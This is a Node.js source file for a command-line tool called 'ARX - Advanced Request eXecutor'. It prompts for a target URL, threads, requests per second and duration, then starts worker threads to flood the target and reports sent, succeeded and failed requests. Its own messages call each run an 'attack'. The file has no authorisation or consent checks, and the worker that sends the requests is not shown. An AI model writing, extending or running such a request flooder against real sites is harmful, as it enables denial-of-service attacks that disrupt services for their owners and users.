const readline = require('readline');
const { Worker } = require('worker_threads');
const path = require('path');

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

let targetId = 0;
const activeTargets = new Map();
const baseLine = 4; // baris awal untuk statistik

function promptTargetInput() {
  rl.question('Target URL: ', (url) => {
    rl.question('Threads (default 10): ', (threads) => {
      rl.question('RPS (default 100): ', (rps) => {
        rl.question('Duration in seconds (default 30): ', (duration) => {
          startTarget({
            id: targetId++,
            url,
            threads: parseInt(threads) || 10,
            rps: parseInt(rps) || 100,
            duration: parseInt(duration) || 30
          });
          showPrompt();
        });
      });
    });
  });
}

function startTarget(target) {
  console.log(`\n[INFO] Starting attack on ${target.url} for ${target.duration}s with ${target.threads} threads at ${target.rps} RPS.`);

  let stats = {};
  for (let i = 0; i < target.threads; i++) {
    const worker = new Worker(path.resolve(__dirname, 'worker.js'), {
      workerData: {
        id: i,
        url: target.url,
        rps: Math.floor(target.rps / target.threads),
        duration: target.duration
      }
    });

    stats[i] = { sent: 0, success: 0, failed: 0 };

    worker.on('message', (msg) => {
      if (msg.stat) {
        stats[msg.id] = {
          sent: msg.sent,
          success: msg.success,
          failed: msg.failed
        };
        printStats(target.id);
      } else if (msg.done) {
        stats[msg.id].done = true;
      }
    });

    worker.on('error', (err) => {
      console.error(`[ERROR] Worker error target#${target.id}: ${err.message}`);
    });
  }

  activeTargets.set(target.id, { target, stats });

  setTimeout(() => {
    activeTargets.delete(target.id);
    printStats(target.id, true);
    showPrompt();
    console.log(`[INFO] Target #${target.id} finished.`);
  }, target.duration * 1000);
}

function printStats(targetId, final = false) {
  const entry = activeTargets.get(targetId);
  if (!entry) return;

  const { target, stats } = entry;
  let totalSent = 0, totalSuccess = 0, totalFailed = 0;
  Object.values(stats).forEach(s => {
    totalSent += s.sent || 0;
    totalSuccess += s.success || 0;
    totalFailed += s.failed || 0;
  });

  const line = baseLine + targetId;

  // Pindah ke baris statistik target
  readline.cursorTo(process.stdout, 0);
  readline.moveCursor(process.stdout, 0, -(process.stdout.rows - line));

  const statText = `[STATS] Sent: ${totalSent} | Success: ${totalSuccess} | Failed: ${totalFailed}   `;
  process.stdout.write(statText);

  // Kembalikan ke prompt input paling bawah
  showPrompt();

  if (final) {
    console.log(`\n[RESULT] Target #${targetId} -> ${target.url}`);
    console.log(`Sent: ${totalSent}, Success: ${totalSuccess}, Failed: ${totalFailed}\n`);
  }
}

function showPrompt() {
  // Prompt berada di bawah semua statistik aktif
  const promptLine = baseLine + activeTargets.size + 1;
  readline.cursorTo(process.stdout, 0);
  readline.moveCursor(process.stdout, 0, promptLine - process.stdout.rows);
  rl.prompt(true);
}

console.log('Selamat datang di ARX - Advanced Request eXecutor');
promptTargetInput();

rl.setPrompt('Command (next/stop): ');
rl.prompt();

rl.on('line', (input) => {
  const cmd = input.trim().toLowerCase();
  if (cmd === 'next') {
    promptTargetInput();
  } else if (cmd === 'stop') {
    console.log('\n[INFO] Stopping input. All running targets will finish.');
    rl.close();
  } else {
    rl.prompt();
  }
});
